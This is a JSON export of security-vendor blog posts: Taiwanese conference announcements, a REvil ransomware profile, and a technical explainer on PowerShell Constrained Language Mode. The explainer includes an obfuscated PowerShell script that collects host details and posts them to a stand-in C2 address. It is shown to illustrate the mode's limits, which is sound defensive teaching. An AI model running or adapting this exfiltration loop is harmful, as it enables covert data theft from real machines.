漏洞研究室」與「目標式勒索威脅論壇」，我們的「TeamT5 Camp 大師帶你學」系列資安入門課程，也搬上資安大會，帶大家深入淺出探索資安最新技術與趨勢。更別錯過 TeamT5 執行長蔡松廷（TT）的精彩主題演講與 Free Talk 喔！\n\n\u003cbr\u003e\n\n** 1. 【Keynote：跟阿中學勒索軟體防疫之道】**\n\n台灣防疫成功，全世界有目共睹。防禦網路攻擊，其實與防疫有許多微妙的相似之處。這場演講，TeamT5 執行長蔡松廷（TT）會跟大家分享，我們如何從防疫中學習到對抗勒索軟體的策略，以及我們如何實作出有效的解決方案。\n\n![facebook_Post_TT_Keynote.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1618837343/facebook_Post_TT_Keynote_a52a0312e1.png)\n\n\u003cbr\u003e\n\n** 2.【貓味，你坐阿！】資安鑑識五連鞭！**\n\nAPT 攻擊手法複雜多樣，企業受駭也不知該從何找起入侵來源。TeamT5 工程師 Zet、Tom 和 Jason3e7 將在本場講座，帶大家從資安事件調查的實戰演練，拼湊攻擊事件原貌。\n\n![facebook_Post_Zet+Tom+Jason3e7.jpg](https://res.cloudinary.com/dvgomg5gh/image/upload/v1619077480/facebook_Post_Zet_Tom_Jason3e7_515b316d8c.jpg)\n\n\u003cbr\u003e\n\n** 3.【701 漏洞研究室】**\n\n白衣渡江，貓味不講武德？這題目有看沒有懂？TeamT5 最幽默的講師群，我們的資安工程師 Tom、Jason3e7 和 Peter，將為大家帶來一場詼諧又知識量爆棚的精彩講座！\n\n![facebook_Post__Tom+Jason3e7+Peter.jpg](https://res.cloudinary.com/dvgomg5gh/image/upload/v1617263321/facebook_Post_Tom_Jason3e7_Peter_37d9599950.jpg)\n\n\u003cbr\u003e\n\n** 4.【大大們的 Free Talk】**\n\n來聽聽 TeamT5 執行長 TT 大大，分享（碎念）本人的資安產業經驗，一起聊聊台灣資安廠商的美麗與哀愁。\n\n![facebook_Post_TT_FreeTalk.jpg](https://res.cloudinary.com/dvgomg5gh/image/upload/v1619751063/facebook_Post_TT_Free_Talk_956eae9ab2.jpg)\n\n\u003cbr\u003e\n\n** 5.【TeamT5 Camp 大師帶你學】**\n\nTeamT5 Camp 的講師群也在資安大會開課囉！整整一天、三堂滿滿的資安入門課程，聽一天課抵十年，名額有限，記得把握機會到現場報名。\n\n![facebook_Post_Kenny.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1618837342/facebook_Post_Kenny_f343a32e2e.png)\n![facebook_Post_Still.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1618837343/facebook_Post_Still_a8b296d6f9.png)\n![facebook_Post_zha.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1618837343/facebook_Post_zha_dd9d531244.png)\n\n\u003cbr\u003e\n\n** 6.【一言不合就公開！REvil 勒索不講武德】**\n\n大會主打主題論壇之一，讓 TeamT5 執行長 TT 為大家揭秘「2020 年度勒索界首富」- REvil。\n\n![facebook_Post_TT_一言不合就公開！ REvil 勒索不講武德.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1619751242/facebook_Post_TT_R_Evil_78dd109ab5.png)\n\n\u003cbr\u003e\n\n\u003e 更多大會議程資訊 \u0026 展攤活動即將公開，敬請隨時鎖定 TeamT5 [Facebook 粉絲專頁](https://www.facebook.com/TeamT5.org)。\n\n\u003cbr\u003e\n","__v":0,"id":"605a9d11c56e80003f985a7a"}],"createdAt":"2021-03-23T08:06:04.117Z","updatedAt":"2021-07-12T09:26:32.679Z","__v":0,"author":"5eec3483163518003f86d943","topic":"5ecaa043a792d70040a0d8b5","publish_date":"2021-04-07T03:00:00.000Z","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1617067914/post_cfead0bebf.png","id":"6059a16cc56e80003f985a6f"},{"publish":true,"enable_form":false,"tags":["6098f2082107530037594ae5","6077eb8c2107530037594a0e","5fd1d9839f8bdc004a7fdf55","60ebe0263f9d29004041a537"],"relative_posts":["60a365f93f9d29004041a487","609899422107530037594a80","60487aacc56e80003f985a39","60c196993f9d29004041a4e1","6077e82e2107530037594a03"],"_id":"6098e8e32107530037594ad3","post_url":"introducing-the-most-profitable-ransomware-revil","post_name":"Introducing The Most Profitable Ransomware REvil","contents":[{"locale":"en","_id":"6098e8e32107530037594ad4","context":"*Image courtesy of [Pixabay](https://pixabay.com/illustrations/security-hacker-web-security-data-5614016/)\n\nIn March 2021, another REvil's attack was announced. Targeting the computer giant Acer, the actors behind the ransomware asked for 50 million dollars, the highest ransom they have demanded so far. Acer was not the only victim of the notorious ransomware. Debuted in April 2019, REvil has attacked hundreds of high-profile agencies in multiple sectors. In 2020, REvil has earned more than 100 million.[1] In this report, we will introduce the basic profile of REvil and share the techniques they used in operations. \n\n\n## What is REvil \n\nREvil, a.k.a Sodinokibi, is a Ransomware as a Service (RaaS) operation deployed by a Russian cybercrime group named GOLD SOUTHFIELD or Pinchy Spider. The group is believed to be based in Russia, as it does not attack organizations in Post-Soviet States, and refuse to cooperate with English speaking cyber criminals.[2] \n\nREvil was highly possible the successor of GandCrab, another notorious ransomware, because of code similarities and REvil's active operations right after GandCrab's retirement.[3]\n\n![REvil_1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1621845336/R_Evil_1_035a848033.png)\n_Figure 1: The timeline of REvil's appearance and GandCrab's retirement_\n\n\u003cbr\u003e\n\n![REvil_2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1621845337/R_Evil_2_804b2676dc.png)\n_Figure 2: REvil and GandCrab's similarity on string decoding_\n\n\u003cbr\u003e\n\n![REvil_3.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1621845337/R_Evil_3_e9724a2992.png)\n_Figure 3: REvil and GandCrab's similarity on building ransom wallpaper_\n\n\u003cbr\u003e\n\nNumerous campaigns attacking multiple sectors were observed all over the world. The REvil actors has attacked local governments, giant law firms, multinational retailers, etc. The highest ransom they have asked was 42 million for the law firm but was now surpassed by the 50 million Acer attack. (References for the events, please see the end of this page.[4])\n\n\u003cbr\u003e\n\n![REvil__4.jpeg](https://res.cloudinary.com/dvgomg5gh/image/upload/v1621845337/R_Evil_4_56bc894487.jpg)\n_Figure 4: The timeline of REvil's notorious attacks_\n\n\u003cbr\u003e\n\n## The Ransomware as a Service model (RaaS)\n\nThe actors of REvil adopt the Ransomware as a Service business model. In this model, Ransomware developers are responsible for development and maintenance of the ransomware, while the groups of cyber criminals, named affiliates in this model, are responsible for accessing victims' system to distribute the ransomware. The business model allows cyber criminals who are not capable of developing their own ransomware to buy the service on dark web and deploy ransomware attack. \n \nThrough this model, REvil actors provide REvil or the customized version of REvil to their affiliates. After they successfully breached victims' systems, REvil actors will ask for ransom by themselves, providing the ransom payment link. After the collection of money, their affiliates will receive 60% to 75% of the profit. Moreover, the actors also provide other paid services, such as money laundering assistance for the affiliates. \n\n![May_blog_3.jpeg](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620634812/May_blog_3_71c24e74f2.jpg)\n\n\u003cbr\u003e\n\n## Tactic, Techniques and Procedures\n### Initial Access\nFor REvil, different affiliates may use different methods for initial access. The ransomware is now distributed primarily through compromised RDP sessions (65%), phishing (16%), and software vulnerabilities (8%).[5] However, a supply chain attack distributing REvil was also observed.\n\nREvils' actors said in an interview that they used brute force attacks to compromise RDP sessions.[1] As for phishing emails, the cyber criminals have once disguised their email as a new booking from \"booking.com\". They also exploit vulnerabilities. In fact, REvil's debut was exploiting the Oracle Weblogic vulnerability, CVE-2019-2725. Moreover, the actors are able to deploy new vulnerabilities after its disclosure. For example, the group used the recent disclosed Microsoft Exchange server vulnerability to access Acer's system.\n\nThe most astounding technique they deployed is supply chain attack. Around June 2019, a WINRAR distributor site in Italy was hacked.[6][7] The software downloaded from the site at that time was not the WINRAR installer but the REvil installer. Although no public announcements showing that any company was infected in this attack, the successful replacement shows that their affiliates were able to deploy a supply chain attack. \n\nApart from their various method on initial access, the cyber criminals also adopted several unique techniques. For example, REvil used Elliptic-curve Diffie-Hellman key exchange to encrypt files, while other ransomware often used RSA, Salsa20 or AES to do so. This method is more efficient as it used shorter key and is difficult to decrypt. \n\n\u003cbr\u003e\n\n## The Effective Methods for Ransom Collection\nNowadays, as ransomware attacks become a serious problem, most companies have learned to back up crucial data in case they are hit by a ransomware. However, ransomware actors develop several new methods to ensure that the victims will pay the ransom, including Double-extortion, VoIP calling, and DDoS attack.\n\n- \"Double-extortion\"\nThe actors disclose or sell the data of the company if the company is not willing to pay ransom. This method was first introduced by Maze, another notorious ransomware, and currently almost all ransomware actors have adopted this method, and so as REvil. Starting from January 2020, the group runs their own site \"Happy Blog\", where they post data extorted from their victims.\n\n- Voice over Internet Protocol (VoIP) calling\nIn February 2021, they announced that they are now offering Voice over Internet Protocol (VoIP) calling and DDoS attack service for their affiliates to make pressure on their victims.[8] They stated that they will call the media or their victims' business partners, telling them about the attack. \n\n\u003cbr\u003e\n\n## Detect and Defense\nFor prevention, it is always crucial to be aware of spamming emails. Nowadays, spamming emails is still the most popular and effective method to access victims' computers. \n\nIn addition, keep an eye on new exploits and updates is also important. Ransomware groups usually are not capable of discovering 0-day exploits by themselves, but they will exploit the disclosed vulnerabilities and attack those who have not updated their system. Thus, keep computers updated and patched systems immediately after the disclosure is essential for preventing ransomware attack.\n\nFurthermore, as the REvil business grows, the actors behind has posted on dark web to recruit more affiliates for their operations. Thus, more attacks from the group is expected. TeamT5 will keep following the ransomware and provide up-to-date information of the notorious ransomware.\n\nTo efficiently prevent ransomware attacks, TeamT5 offers a total solution for enterprise protection. Our unique ransomware containment technology is proven to successfully block many types of ransomware, which can detect and stop malicious ransomware immediately. And even restore encrypted files from the backup.\n\nFor more information about TeamT5 Ransomware Prevention total solution, please contact: \u003csales@teamt5.org\u003e\n\n\u003cbr\u003e\n\n## References\n\n[1] https://therecord.media/i-scrounged-through-the-trash-heaps-now-im-a-millionaire-an-interview-with-revils-unknown/\n\n[2] https://www.advanced-intel.com/post/inside-revil-extortionist-machine-predictive-insights\n\n[3] https://www.zdnet.com/article/gandcrab-ransomware-operation-says-its-shutting-down/\n\n[4] Texas Municipalities - https://www.zdnet.com/article/at-least-20-texas-local-governments-hit-in-coordinated-ransomware-attack/; Backup Company - https://www.zdnet.com/article/ransomware-hits-hundreds-of-dentist-offices-in-the-us/; Foreign Exchange Company - https://www.bbc.com/news/business-51017852; US Law Firm - https://www.zdnet.com/article/ransomware-gang-asks-42m-from-ny-law-firm-threatens-to-leak-dirt-on-trump/; Pan-Asia Retailer - https://www.bleepingcomputer.com/news/security/pan-asian-retail-giant-dairy-farm-suffers-revil-ransomware-attack/\n\n[5] https://www.csoonline.com/article/3597298/revil-ransomware-explained-a-widespread-extortion-operation.html\n\n[6] https://www.drcommodore.it/2019/06/20/hackerato-winrar-it-malware-al-posto-del-programma/\n\n[7] https://www.bleepingcomputer.com/news/security/sodinokibi-ransomware-spreads-wide-via-hacked-msps-sites-and-spam/\n\n[8] https://www.bleepingcomputer.com/news/security/ransomware-gang-plans-to-call-victims-business-partners-about-attacks/\n","title":"Introducing The Most Profitable Ransomware REvil","__v":0,"id":"6098e8e32107530037594ad4"}],"createdAt":"2021-05-10T08:03:47.679Z","updatedAt":"2021-07-12T09:26:32.679Z","__v":1,"author":"5eeae9e3163518003f86d917","topic":"5ecaa012a792d70040a0d8b1","publish_date":"2021-06-02T02:30:00.000Z","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1621592937/security_5614016_1920_e059cbe3c6.png","id":"6098e8e32107530037594ad3"},{"publish":true,"enable_form":false,"tags":["6077eb812107530037594a0d","6063e4e43e88da003f2f660c","609b55892107530037594b0c"],"relative_posts":["609899422107530037594a80","6059a16cc56e80003f985a6f","60a365f93f9d29004041a487","6098e8e32107530037594ad3","60b5e6a53f9d29004041a4cd"],"_id":"609b4c052107530037594b01","post_name":"【工商時報】又一重大勒索軟體攻擊 TeamT5：資安防禦做對方向是關鍵","post_url":"ctee-teamt5-threat-intelligence-is-key-to-strengthening-cyber-defenses","contents":[{"locale":"tw","_id":"609b4c052107530037594b02","title":"【工商時報】又一重大勒索軟體攻擊 TeamT5：資安防禦做對方向是關鍵","__v":0,"context":"上週美國輸油管系統營運商遭到勒索軟體攻擊，暫停所有管線運作，可能造成燃料短缺而導致油價上漲，引發市場擔憂，而近年層出不窮的勒索攻擊事件，日益嚴重，目標式攻擊手法推陳出新，已非傳統防禦方式所能抵擋，有效的資安防護成為市場迫切之需。\n\nTeamT5 杜浦數位安全（以下簡稱 TeamT5）創辦人兼執行長蔡松廷表示：「面對進階型的威脅，防禦會是比較困難的，資安最難的地方在於要做的事太多了，做對了就會有效，如果做錯方向，對於防護就沒有效果。 TeamT5 由端點切入，提供 MDR（Managed Detection and Response，威脅偵測應變）從雲端偵測異常並通報，比較特別的是，TeamT5 團隊做很多情資研究，透過對攻擊者的了解，可以預測到他的下一步，讓客戶知道什麼防護要先做，做真正對的方向。」\n\n[點此閱讀完整報導](https://ctee.com.tw/industrynews/technology/457958.html?fbclid=IwAR02bz0y_3a5APIwS6PhC5HpJnMTW1YJ-CF8igPda-hxE8r-OAYXHoIQbEQ)\n\n\u003cbr\u003e\n","id":"609b4c052107530037594b02"}],"createdAt":"2021-05-12T03:31:17.161Z","updatedAt":"2021-06-10T04:41:15.817Z","__v":1,"author":"5eec3483163518003f86d943","topic":"5ecaa036a792d70040a0d8b4","publish_date":"2021-05-10T05:00:00.000Z","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1620791442/AX_0_7048_7e68a71115.jpg","id":"609b4c052107530037594b01"},{"publish":true,"enable_form":false,"tags":["5ece28882e1ee4004aa406f2","5eec1394163518003f86d929","5f979c9e1d1f9c004b931d5c","6063e4e43e88da003f2f660c"],"relative_posts":["609899422107530037594a80","6059a16cc56e80003f985a6f","609b4c052107530037594b01","6098e8e32107530037594ad3","60b5e6a53f9d29004041a4cd","6077e82e2107530037594a03"],"_id":"60a365f93f9d29004041a487","post_name":"【臺灣資安大會】TeamT5 對抗勒索，攻擊全面防堵","post_url":"cybersec-2021-teamt5-announces-ransomware-prevention-solution","publish_date":"2021-05-18T04:00:00.000Z","contents":[{"locale":"tw","_id":"60a365f93f9d29004041a488","title":"【臺灣資安大會】TeamT5 對抗勒索，攻擊全面防堵","context":"\u003cbr\u003e\n\n一年一度的 CYBERSEC 2021 臺灣資安大會於 5 月 4 日至 6 日在南港展覽二館圓滿落幕，TeamT5 杜浦數位安全（以下簡稱 TeamT5）今年以三大重點參展：「最佳夥伴」、「對抗勒索」、「情資決勝」，在網路攻擊不斷轉型、進化的今日，TeamT5 將成為您最可靠的盟友，共同對抗網路威脅。\n\n![AX1_9828.jpg](https://res.cloudinary.com/dvgomg5gh/image/upload/v1621322561/AX_1_9828_23b4ad3bf5.jpg)\n_TeamT5 杜浦數位安全提供對抗勒索攻擊的最佳解方，以及研究量能最豐富的威脅情資，幫助企業對抗網路威脅_\n\n\u003cbr\u003e\n\n面對近年來國際間頻繁發生的加密勒索資安事件，攻擊手法與目標對象逐漸轉型，使得勒索攻擊成為當前企業最擔憂的網路威脅。TeamT5 長年研究、追蹤進階持續性攻擊（Advanced Persistent Threat, APT），在本次資安大會上，我們獨家公開全新升級的 ThreatSonar 威脅補網，提出對抗勒索攻擊的防護解方。\n\n![AX0_6835.jpg](https://res.cloudinary.com/dvgomg5gh/image/upload/v1621322561/AX_0_6835_790f9537f0.jpg)\n_TeamT5 首席架構師 Nanika 向大家介紹 ThreatSonar 全面升級的勒索防堵策略_\n\n\u003cbr\u003e\n\nTeamT5 提出「勒索全面防堵」策略，我們的 ThreatSonar 威脅狩獵解決方案，能夠有效偵測 APT 針對型攻擊，與既有資安解決方案互補而非取代，成為企業在資安攻防的強力守護神。以事件處理的角度來看，勒索軟體與 APT 攻擊事件幾近相同，唯一不同之處在於攻擊者會藉此勒索受害者、獲取贖金，唯有全面性解決，才能讓人員更有效進行處理，在防堵的同時擬定執行策略。\n\n![P_20210506_133205.jpg](https://res.cloudinary.com/dvgomg5gh/image/upload/v1621324929/P_20210506_133205_1805110f15.jpg)\n_TeamT5 技術長暨首席分析師 Charles 與 IR 專家 Zha0，介紹利用威脅情資掌握攻擊者動向的重要性，以達到超前部署的防護_\n\n\u003cbr\u003e\n\n此外，今年最受矚目的參展亮點還有「TeamT5 MoMA 攻擊族群博物館」，以及 TeamT5 獨家打造的「1337 Operation」搜索實境遊戲。蔡英文總統與各部會長官也親臨攤位參觀，由 TeamT5 執行長蔡松廷（ TT）帶領導覽，介紹我們如何以更貼近、淺顯易懂的方式，將神秘的駭客攻擊族群具象化為藝術品。更特別的是，我們將攻擊族群博物館連結搜索實境遊戲關卡，以逼真的勒索軟體事件調查遊戲情境，讓玩家實際體驗企業受害與追查駭客的過程。\n\n![經濟部工業局提供.jpg](https://res.cloudinary.com/dvgomg5gh/image/upload/v1621326181/_e8ae0b779f.jpg)\n_執行長蔡松廷向蔡英文總統與各部會長官們導覽「TeamT5 MoMA 攻擊族群博物館」，介紹我們如何透過將抽象的攻擊族群具象化為藝術品的方式，讓大家更深入了解 APT 族群的特性。（圖片來源：[經濟部工業局](https://www.facebook.com/moeaidb/photos/pcb.1996144607216335/1996143887216407)授權使用）_\n\n![IMG_0462.JPG](https://res.cloudinary.com/dvgomg5gh/image/upload/v1621326184/IMG_0462_fb0cf9e235.jpg)\n_TeamT5 獨家設計的搜索實境遊戲，只要一支手機，玩家就可以化身探員，實際體驗追查駭客的過程_\n\n\u003cbr\u003e\n\n為期三天的展會中，TeamT5 透過大會多場精彩議程、CyberLAB 技術課程，以及我們精心策劃的攤位主題限定講座，帶給所有前來參展的來賓充實的技術分享與交流。兩場 TeamT5 專家座談「資安海外拓展交流」和「難纏的勒索軟體與對抗經驗」，也邀請多位資安專家與研究人員到場分享相關經驗與知識，獲得許多與會來賓的正向回饋。\n\n![IMG_0336.JPG](https://res.cloudinary.com/dvgomg5gh/image/upload/v1621322565/IMG_0336_5c72d3f9f7.jpg)\n![AX0_7203.jpg](https://res.cloudinary.com/dvgomg5gh/image/upload/v1621322561/AX_0_7203_f8a4840a25.jpg)\n_TeamT5 獨家邀請到多位資安專家，在兩場攤位限定專家座談中，和大家分享資安海外拓展以及勒索軟體的對抗經驗，吸引許多參展來賓參與討論交流_\n\n\u003cbr\u003e\n\n","__v":0,"id":"60a365f93f9d29004041a488"}],"createdAt":"2021-05-18T07:00:09.809Z","updatedAt":"2021-07-12T09:26:32.679Z","__v":1,"author":"5eec3483163518003f86d943","topic":"5ecaa036a792d70040a0d8b4","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1621326864/IMG_0732_fbff0513b5.jpg","id":"60a365f93f9d29004041a487"}],"id":"609899422107530037594a80"},{"publish":true,"enable_form":false,"tags":[{"_id":"6018b953c56e80003f9859cb","name":"PowerShell","createdAt":"2021-02-02T02:30:43.906Z","updatedAt":"2021-02-02T03:54:49.732Z","__v":0,"id":"6018b953c56e80003f9859cb"},{"_id":"6018ccf4c56e80003f9859cc","name":"Constrained Language Mode","createdAt":"2021-02-02T03:54:28.919Z","updatedAt":"2021-02-05T02:54:38.296Z","__v":0,"id":"6018ccf4c56e80003f9859cc"}],"relative_posts":[],"_id":"6017c9aac56e80003f9859ba","post_url":"a-deep-dive-into-powershell-s-constrained-language-mode","post_name":"A Deep Dive into PowerShell's Constrained Language Mode","contents":[{"locale":"en","_id":"6017c9aac56e80003f9859bb","title":"A Deep Dive into PowerShell's Constrained Language Mode","context":"*Image courtesy of [Pexels](https://www.pexels.com/zh-tw/photo/3803517/)\n\n## What is Constrained Language Mode and Why it Matters\n\nWhen PowerShell was [first announced in 2006](https://betanews.com/2006/11/14/windows-powershell-1-0-released/), it was meant to be a flexible command-line shell that features an easy-to-understand yet advanced scripting engine for IT admins. Fast forward to (almost) a decade and a half later, PowerShell has caught up in popularity and has superseded the now-legacy `cmd.exe` in current Windows 10 releases.\n\nHowever, PowerShell has also been weaponized heavily over the past decade. There is an abundance of PowerShell-based samples all over public sandboxes, and [APTs are known to abuse it whenever possible](https://attack.mitre.org/techniques/T1059/001/). The advanced scripting engine is often utilized to launch fileless/in-memory attacks or [use it as a way around AMSI](https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/). In this post, we will be focusing on a lesser-known feature that can be used to combat this threat: Language Mode.\n\nPowerShell was launched with an option to change its [\"Language Mode\"](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes). This Language Mode option allows the user to switch between syntaxes allowed or disallowed. By default, all PowerShell sessions are launched with `FullLanguage`, which permits all the available syntaxes and cmdlets at runtime. There are four total language modes available: `FullLanguage`, `RestrictedLanguage`, `NoLanguage` and finally `ConstrainedLanguage`. In today's topic, we are here to focus on the `ConstrainedLanguage` mode introduced in PowerShell 3.0.\n\n\u003cbr\u003e\n\n### Safer PowerShell Environment\n\nFirst off, let's take a look at what Microsoft Docs says about the `ConstrainedLanguage` mode:\n\n\u003e - All cmdlets in Windows modules, and other UMCI-approved cmdlets, are fully functional and have complete access to system resources, except as noted.\n\u003e - All elements of the PowerShell scripting language are permitted.\n\u003e - All modules included in Windows can be imported and all commands that the modules export run in the session.\n\u003e - In PowerShell Workflow, you can write and run script workflows (workflows written in the PowerShell language). XAML-based workflows are not supported and you cannot run XAML in a script workflow, such as by using Invoke-Expression -Language XAML. Also, workflows cannot call other workflows, although nested workflows are permitted.\n\u003e - The Add-Type cmdlet can load signed assemblies, but it cannot load arbitrary C# code or Win32 APIs.\n\u003e - The New-Object cmdlet can be used only on allowed types (listed below).\n\u003e - Only allowed types (listed below) can be used in PowerShell. Other types are not permitted.\n\u003e - Type conversion is permitted, but only when the result is an allowed type.\n\u003e - Cmdlet parameters that convert string input to types work only when the resulting type is an allowed type.\n\u003e - The ToString() method and the .NET methods of allowed types (listed below) can be invoked. Other methods cannot be invoked.\n\u003e - Users can get all properties of allowed types. Users can set the values of properties only on Core types. Only the following COM objects are permitted:\n\u003e   - Scripting.Dictionary\n\u003e   - Scripting.FileSystemObject\n\u003e   - VBScript.RegExp\n\n\u003cbr\u003e\n\n#### No Arbitrary C# Code via Add-Type\n\n\u003e The Add-Type cmdlet can load signed assemblies, but it cannot load arbitrary C# code or Win32 APIs.\n\nMany PowerShell-based exploits rely on .NET-based language compilation via `Add-Type` - and that's already thrown out the window by disallowing arbitrary C# code compilation.\n\n![202101-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230067/202101_1_38111256c4.png)\n\n\u003cbr\u003e\n\n#### Non-whitelisted Types are Prohibited\n\n\u003e - The New-Object cmdlet can be used only on allowed types (listed below).\n\u003e - Only allowed types (listed below) can be used in PowerShell. Other types are not permitted.\n\u003e - Type conversion is permitted, but only when the result is an allowed type.\n\u003e - Cmdlet parameters that convert string input to types work only when the resulting type is an allowed type.\n\u003e - The ToString() method and the .NET methods of allowed types (listed below) can be invoked. Other methods cannot be invoked.\n\nIn laymen's terms, every non-whitelisted type and its methods/properties are blocked from execution. Classes such as `System.Reflection.Assembly`/`System.Convert`/`System.Runtime.CompilerServices` and many more are out-of-reach for threat actors, making code injection or fileless attacks that rely on additional PEs much more difficult.\n\n![202101-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230068/202101_2_ec73ef8561.png)\n\n\u003cbr\u003e\n\n### Prohibit Complex Scripts from Executing\n\nGiven the above limitations, this does mean that legitimate complex scripts may not be able to execute correctly. For instance, if your organization uses a script that utilizes WinForm or WPF (Windows Presentation Framework), those will not work at all.\n\n![202101-3.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230068/202101_3_80ad190a95.png)\n\nConsequentially, modules are affected by this whitelisting system as well. Modules that rely on created types or non-whitelisted type calls will not load properly.\n\n![202101-4.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230067/202101_4_aa876d7833.png)\n\nTherefore, it is crucial to **double-check your organization's scripts** (if you have any) *before* enrolling this policy to your endpoints.\n\n\u003cbr\u003e\n\n### Require Explicit Feature Enrollment\n\nSince, by default, this language mode is an opt-in feature, the user would either have to call `$ExecutionContext.SessionState.LanguageMode = \"ConstrainedLanguage\"` at the beginning of each session or add `__PSLockdownPolicy` to the system environment variables (**DO NOT** do this for production. [See the section below](#beware-of-pslockdownpolicy). Neither of which is ideal and should only be used for debugging, unit testing, or for general testing purposes only.\n\nInstead, the administrator(s) of your organization should deploy via WDAC (Windows Defender Application Control) on Windows 10+ *or* via AppLocker on Windows 7+. When implemented this way, the attacker will first have to bypass WDAC or AppLocker before gaining full control of a standard PowerShell session. A guideline regarding the deployment for individual or mass number of endpoints can be found under the [Application Control for Windows](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control) article on Microsoft Docs.\n\n\u003cbr\u003e\n\n### Effective Against Scripts, not Standard Cmdlets\n\nIt must be made clear that merely enabling Constrained Language Mode is not enough to mitigate the risks PowerShell can bring. While restricting users to a lower-privileged language mode ensures no custom .NET assemblies or code can be executed, this does not stop attackers from crafting malicious scripts from the built-in cmdlets alone. For example, an attacker may still be able to craft a script that collects relevant intel about the computer and send it back to their C2 station.\n\nThe following, as an example, will continue to run fine under a PowerShell session with Constrained Language mode enabled.\n\n```ps1\nStart-Job -ScriptBlock {\n while($true){\n  # MAC address collection\n  .(\"{1}{3}{2}{0}\" -f 'ariable', 'S', 't-V', 'e') -Name (\"{1}{0}\" -f 'ata', 'd') -Value (.(\"{3}{2}{0}{1}\" -f 'Ada', 'pter', 'Net', 'Get-') | .(\"{1}{0}\" -f 'ect', 'sel') (\"{1}{0}{3}{2}\" -f 'erfac', 'Int', 's', 'eAlia'), (\"{0}{1}{2}\" -f 'MacA', 'd', 'dress') | \u0026(\"{3}{2}{0}{1}\" -f 'r', 'tTo-Json', 'e', 'Conv') -Compress) \u003e $null\n  # OSs + username collection\n  .(\"{2}{0}{1}\" -f '-', 'Variable', 'Set') -Name (\"{0}{1}\" -f 'd', 'ata') -Value (${D`ATa} + (.(\"{0}{2}{3}{1}\" -f 'Ge', 'nce', 't-CimInst', 'a') (\"{1}{0}{3}{2}\" -f 'ting', 'Win32_Opera', 'em', 'Syst') | .(\"{0}{1}\" -f 'se', 'lect') (\"{0}{1}\" -f 'na', 'me'), (\"{1}{0}\" -f 'me', 'CSNa') | \u0026(\"{2}{3}{1}{0}{4}\" -f 'o-Js', 'T', 'Conve', 'rt', 'on') -Compress)) \u003e $null\n  # WAN IP collection\n  \u0026(\"{0}{1}{2}{3}\" -f 'Set-', 'Vari', 'abl', 'e') -Name (\"{1}{0}\" -f 'ta', 'da') -Value (${D`AtA} + ((.(\"{1}{0}\" -f 'r', 'iw') -useb (\"{1}{0}{2}\" -f 'fig', 'ifcon', '.me') -user (\"{0}{1}\" -f 'cur', 'l')).\"cO`NTe`Nt\")) \u003e $null\n  # Saves data to a temporary file (usually this is done in-memory by threat actors, but in-memory execution purely based on existing cmdlets is either impossible or very difficult)\n  .(\"{1}{0}{2}\" -f '-Variabl', 'Set', 'e') -Name ('a') -Value (\"$env:temp\\$(New-Guid).txt\")\n  ${Da`Ta} | \u0026(\"{1}{2}{0}\" -f 'le', 'O', 'ut-Fi') ${a}\n  # Compresses the file\n  \u0026(\"{3}{0}{2}{1}\" -f 'ompr', 'Archive', 'ess-', 'C') -De \"$a.zip\" -Co (\"{0}{1}\" -f 'Op', 'timal') -Lit ${a}\n  # Sends it back to the C2 station\n  \u0026(\"{1}{0}\" -f 'r', 'iw') (\"{0}{2}{3}{4}{1}\" -f 'h', '00', 'ttp://evil', '.tld:', '80') -method (\"{1}{0}\" -f 'st', 'po') -body (.(\"{1}{0}{2}\" -f 'Co', 'Get-', 'ntent') -Lit \"$a.zip\") \u003e $null\n  \u0026(\"{2}{1}{0}\" -f 'leep', 't-S', 'Star') -Seconds 2\n  }\n}\n```\n\nAdditionally, attackers may still be able to call external resources to achieve their goal, such as achieving persistence via `schtask` or placing additional payloads under `shell:startup`. Remember, Constrained Language mode does **NOT** block most existing cmdlets from functioning; in other words, it limits what the threat actor has on their disposal, but does not mean that they cannot make do with vanilla cmdlets or standard Windows applications.\n\n\u003cbr\u003e\n\n#### Beware of `__PSLockdownPolicy`\n\nAside from weaponizing existing cmdlets, if the admins had \"enabled\" the language feature via `__PSLockdownPolicy`, then it would be trivial for attackers with administrative privileges to restore the language policy. Let's take a look at what this environment variable actually does.\n\n![202101-5.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230068/202101_5_707aff90b6.png)\n\nWe'll see that it has brought us to the `SystemPolicy` class under the `wldpNativeMethods.cs` file. In various articles that reference this environment variable, they would instruct the administrator to set the `__PSLockdownPolicy` variable to `4`. A value of 4 corresponds with the `WLDP_LOCKDOWN_UMCIENFORCE_FLAG` constant, which indicates the enforcement of UMCI (User-mode Code Integrity).\n\n![202101-6.gif](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230069/202101_6_2a4f7bdb5c.gif)\n\nThe call's parent method happens to be named `GetDebugLockdownPolicy`, which indicates that this behavior was meant to be a debug feature, rather than something that should be in a production environment.\n\n![202101-7.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230072/202101_7_4f3622def2.png)\n\nThis theory is further backed up by the statement made by [Matt Graeber](https://twitter.com/mattifestation/status/921509830644269062), a renowned security researcher well-versed in WDAC. Further research also shows this behavior was mentioned by the PowerShell team in its [official post regarding Constrained Language Mode as well](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/):\n\n\u003e As part of the implementation of Constrained Language, PowerShell included an environment variable for debugging and unit testing called `__PSLockdownPolicy`. While we have never documented this, some have discovered it and described this as an enforcement mechanism. This is unwise because an attacker can easily change the environment variable to remove this enforcement. 